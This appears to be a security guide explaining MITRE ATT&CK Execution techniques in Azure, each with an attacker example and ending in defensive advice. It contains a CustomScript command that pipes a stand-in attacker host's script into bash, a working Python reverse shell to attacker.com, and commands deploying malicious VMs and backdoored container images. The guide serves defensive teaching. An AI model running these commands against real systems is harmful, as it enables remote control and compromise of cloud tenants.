# Execution TA0002

## **Execution Techniques in Azure Environments**

In Microsoft Azure, adversaries use Execution techniques to run code and control resources post-initial access. Execution may happen by abusing legitimate Azure APIs, uploading and triggering malicious images or workloads, or executing code through serverless platforms like Azure Functions or Logic Apps.

Execution in Azure often blends native cloud administration and code execution paths, making detection tricky if defenses aren't tuned.

***

### Cloud Administration Command **T1651**

**Description**:\
Use Azure-native management interfaces (CLI, Portal, REST API, PowerShell) to run administrative operations that lead to code execution or resource manipulation.

**Azure Example**:\
An attacker with valid credentials uses the Azure CLI to deploy a malicious Virtual Machine:

```bash
az vm create --resource-group victim-rg --name malicious-vm --image UbuntuLTS --admin-username hacker --generate-ssh-keys
```

Or run arbitrary script extensions on an existing VM:

```bash
az vm extension set --publisher Microsoft.Azure.Extensions --name CustomScript --vm-name target-vm --resource-group target-rg --settings '{"commandToExecute":"curl http://attacker.com/payload.sh | bash"}'
```

**Result**: Code execution on Azure VMs without needing local exploit — pure abuse of cloud admin capabilities.

***

### Command and Scripting Interpreter **T1059**

**Description:**

Command and Scripting Interpreter refers to adversaries abusing command-line interfaces (CLIs), shells, or scripting engines to execute arbitrary commands, scripts, or payloads within a target environment.

Rather than deploying custom malware immediately, attackers leverage built-in interpreters like bash, PowerShell, Python, JavaScript, or cloud-native APIs to:

* Run malicious commands
* Automate exploitation or exfiltration tasks
* Establish persistence
* Move laterally across systems

Because shells and interpreters are standard components of all environments — containers, VMs, on-prem, and cloud — their use often blends into normal operations unless closely monitored.

### **Cloud API** T1059.009

**Description**:\
Execute code by directly interacting with Azure Resource Manager (ARM) APIs or service-specific APIs (e.g., Azure Kubernetes Service, Azure Functions) to create and run workloads.

**Azure Example**:\
An attacker uses raw REST API calls to deploy a container:

```bash
curl -X PUT https://management.azure.com/subscriptions/<sub-id>/resourceGroups/<rg>/providers/Microsoft.ContainerInstance/containerGroups/malicious-container?api-version=2021-03-01 \
  -H "Authorization: Bearer <token>" \
  -d @malicious-container-payload.json
```

**Result**: Programmatic creation of attack infrastructure without detection if API telemetry isn’t watched.

***

### Serverless Execution T1648

**Description**:\
Deploy and trigger malicious Azure Functions, Logic Apps, or Event Grid handlers to run attacker-controlled code without needing to maintain infrastructure.

**Azure Example**:\
An attacker uploads a malicious Azure Function using stolen credentials:

```bash
func azure functionapp publish victim-function-app --python
```

Or directly edits an HTTP-triggered Azure Function to insert reverse shell code:

```python
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Result**: Fully serverless, covert C2 channel established in Azure.

***

### User Execution T1204

Adversaries rely on social engineering or human error to trick users or automated systems into executing malicious code.

In containerized environments, User Execution often involves:

* Tricking DevOps teams into pulling or running malicious container images.
* Injecting backdoored images into trusted registries.
* Abusing automation (e.g., CI/CD pipelines) to deploy compromised containers without immediate human review.

#### **Malicious Image** T1204.003

**Description**:\
Upload or deploy a backdoored container image to Azure Container Registry (ACR), Azure Kubernetes Service (AKS), or Azure Container Instances (ACI), tricking users or workloads into executing it.

**Azure Example**:\
An attacker pushes a malicious container image into ACR:

```bash
az acr login --name victimacr
docker tag backdoor:latest victimacr.azurecr.io/backdoor:latest
docker push victimacr.azurecr.io/backdoor:latest
```

Then deploys it to AKS:

```bash
kubectl run pwned-pod --image=victimacr.azurecr.io/backdoor:latest
```

**Result**: The malicious container runs inside AKS, ACI, or other containerized workloads.

***

## Summary of **Execution Techniques in Azure**&#x20;

| Technique/Subtechnique                        | MITRE ID      | Azure Example                                                                                                |
| --------------------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------ |
| Cloud Administration Command                  | **T1651**     | Use Azure CLI, PowerShell, or REST API to run admin commands (e.g., deploy VMs, run CustomScript extensions) |
| Command and Scripting Interpreter → Cloud API | **T1059.009** | Execute code via direct REST API calls (e.g., ARM API to deploy containers)                                  |
| Serverless Execution                          | **T1648**     | Deploy malicious Azure Functions, Logic Apps, Event Grid handlers to trigger code automatically              |
| User Execution → Malicious Image              | **T1204.003** | Push and deploy backdoored container images into ACR, AKS, or ACI                                            |

## Final Summary

Defending against Execution in Azure focuses on:

* **Monitoring cloud administrative actions closely** (API calls, deployments)
* **Hardening workloads** (image signing, runtime controls, serverless code reviews)
* **Restricting who can deploy or modify code** (strict role assignments)
* **Detecting anomalous deployment and execution behavior** (Defender for Cloud, Sentinel rules)
